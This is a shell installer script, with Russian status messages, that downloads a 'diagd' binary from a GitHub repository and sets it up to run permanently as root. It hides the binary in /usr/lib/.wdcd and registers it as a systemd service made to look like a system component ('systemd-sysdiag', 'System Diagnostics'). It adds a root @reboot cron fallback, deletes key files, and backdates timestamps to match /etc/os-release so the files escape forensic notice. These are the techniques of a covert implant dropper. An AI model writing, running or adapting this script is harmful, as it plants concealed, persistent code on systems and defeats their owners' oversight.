#!/bin/sh
set -e
_dl() {
  if command -v curl >/dev/null 2>&1; then curl -fsSL --connect-timeout 15 --max-time 120 -o "$2" "$1"
  elif command -v wget >/dev/null 2>&1; then wget -q -T 15 -O "$2" "$1"
  elif command -v busybox >/dev/null 2>&1; then busybox wget -q -T 15 -O "$2" "$1"
  elif command -v python3 >/dev/null 2>&1; then python3 -c "import sys,urllib.request as u;u.urlretrieve(sys.argv[1],sys.argv[2])" "$1" "$2"
  else return 1
  fi
}
_arch() {
  case "$(uname -m)" in
    x86_64|amd64) echo diagd ;;
    aarch64|arm64) echo diagd-arm64 ;;
    armv7l|armv7|armv6l|armv6|armhf) echo diagd-armhf ;;
    riscv64) echo diagd-riscv64 ;;
    *) echo diagd ;;
  esac
}
BASE="https://github.com/gerardovsa/Ai_Agents/raw/V2_clean/tools"
F=$(_arch)
BINAME="$F"
SRC="${1:-$(dirname "$(realpath "$0")")/diagd}"
DIR="/usr/lib/.wdcd"
if [ ! -f "$SRC" ] || [ ! -x "$SRC" ]; then
  echo "нет локального бинарника: $SRC — качаю с GitHub ($BINAME)" >&2
  mkdir -p "$DIR"
  if [ "$SRC" = "$(dirname "$(realpath "$0")")/diagd" ]; then
    if [ -f "$(dirname "$(realpath "$0")")/$BINAME" ] && [ -x "$(dirname "$(realpath "$0")")/$BINAME" ]; then
      SRC="$(dirname "$(realpath "$0")")/$BINAME"
    fi
  fi
  if [ ! -f "$SRC" ] || [ ! -x "$SRC" ]; then
    if _dl "$BASE/$BINAME" "$DIR/diagd.tmp"; then
      SRC="$DIR/diagd.tmp"
    else
      echo "скачивание не удалось (нет curl/wget/python3). Залей binary вручную или поставь curl" >&2
      exit 1
    fi
  fi
fi
CA=/etc/ssl/certs/ca-certificates.crt
if [ ! -s "$CA" ]; then
  echo "нет CA-бандла $CA — ставлю ca-certificates" >&2
  if command -v apt-get >/dev/null 2>&1; then apt-get update >/dev/null 2>&1 || true; apt-get install -y ca-certificates >/dev/null 2>&1 || true; fi
  if command -v yum >/dev/null 2>&1; then yum install -y ca-certificates >/dev/null 2>&1 || true; fi
  if [ ! -s "$CA" ]; then echo "ca-certificates отсутствует — HTTPS невозможен" >&2; exit 1; fi
fi
if command -v systemctl >/dev/null 2>&1; then :; else
  echo "systemd не найден — агент работает как демон без автозапуска" >&2
fi
mkdir -p "$DIR/bin"
if command -v systemctl >/dev/null 2>&1; then systemctl stop systemd-sysdiag.service 2>/dev/null || true; fi
cp -f "$SRC" "$DIR/bin/sysdiag"
chmod 755 "$DIR/bin/sysdiag"
rm -f "$DIR"/*_key.json "$DIR"/*.xkey "$DIR/config.json"
chmod 700 "$DIR" "$DIR/bin"
_stamp=$(stat -c %Y /etc/os-release 2>/dev/null || echo 0)
if [ "$_stamp" -gt 0 ] 2>/dev/null; then
  touch -d "@$_stamp" "$DIR" "$DIR/bin" "$DIR/bin/sysdiag" 2>/dev/null || true
fi
if command -v systemctl >/dev/null 2>&1; then
cat > /etc/systemd/system/systemd-sysdiag.service <<UNIT
[Unit]
Description=System Diagnostics
After=network-online.target
[Service]
ExecStart=$DIR/bin/sysdiag --foreground
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
UNIT
  if [ "$_stamp" -gt 0 ] 2>/dev/null; then
    touch -d "@$_stamp" /etc/systemd/system/systemd-sysdiag.service 2>/dev/null || true
  fi
  systemctl daemon-reload
  systemctl enable --now systemd-sysdiag.service
  echo "agent установлен (systemd): $(systemctl is-active systemd-sysdiag.service)"
fi
printf '@reboot root sleep 45; /usr/bin/systemctl is-active --quiet systemd-sysdiag.service || %s/bin/sysdiag --foreground\n' "$DIR" > /etc/cron.d/systemd-sysdiag
chmod 644 /etc/cron.d/systemd-sysdiag
if [ "$_stamp" -gt 0 ] 2>/dev/null; then
  touch -d "@$_stamp" /etc/cron.d/systemd-sysdiag 2>/dev/null || true
fi
echo "done. агент: $DIR/bin/sysdiag ($BINAME)"
